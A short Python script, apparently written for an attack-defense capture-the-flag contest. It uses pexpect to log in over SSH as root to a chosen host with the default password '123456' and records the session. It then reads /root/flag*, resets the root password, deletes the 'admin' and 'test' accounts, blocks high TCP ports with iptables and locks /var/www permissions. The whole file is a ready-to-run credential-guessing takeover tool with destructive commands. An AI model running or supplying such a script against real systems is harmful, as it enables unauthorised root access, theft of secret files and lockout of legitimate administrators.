#!/usr/bin/env python 

import optparse
import pexpect

parser = optparse.OptionParser('usage%prog '+'-H <target host>')
parser.add_option('-H',dest='tgtHost',type='string',help='special target host')
(options,args)=parser.parse_args()
host=options.tgtHost
a='ssh root@'+str(host)
b='/home/SSH.'+str(host)
child=pexpect.spawn(a)
fp22=open(b,"wb")
child.logfile=fp22
ret = child.expect(['yes/no','.*assword'])
if(ret==0):
    child.send("yes\r")
    child.send("123456\r")
if(ret==1):
    child.send("123456\r")
child.send("cat /root/flag*\r")
child.send("echo root:whd1q2w3e4r | chpasswd\r")
child.send("userdel admin\r")
child.send("userdel test\r")
child.send("iptables -A INPUT -p tcp --dport 1025: -j DROP\r")
child.send("chmod -R 700 /var/www\r")
child.send("exit\r")
child.expect(pexpect.EOF)
fp22.close()
